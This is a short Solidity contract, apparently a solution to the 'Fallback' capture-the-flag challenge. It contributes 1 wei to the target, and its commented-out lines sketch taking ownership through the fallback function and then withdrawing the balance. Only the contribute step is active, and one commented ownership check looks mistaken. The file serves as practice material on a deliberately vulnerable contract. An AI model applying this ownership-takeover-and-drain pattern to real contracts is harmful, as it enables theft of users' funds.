// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "./Fallback.sol";

contract FallbackSolution {
    Fallback fallbackContract;

    constructor(address payable _fallbackAddress) {
        fallbackContract = Fallback(_fallbackAddress);
    }

    function solve() public payable {
        require(msg.value == 2 wei);

        fallbackContract.contribute{value: 1 wei}(); // contribute 1 wei
        // require(fallbackContract.getContribution() == 1);

        // (bool success, bytes memory data) = address(fallbackContract).call{value: 1 wei}(""); // invoke fallback()
        // require(success);
        // require(fallbackContract.owner() == msg.sender);

        // fallbackContract.withdraw(); // invoke withdraw
    }
}
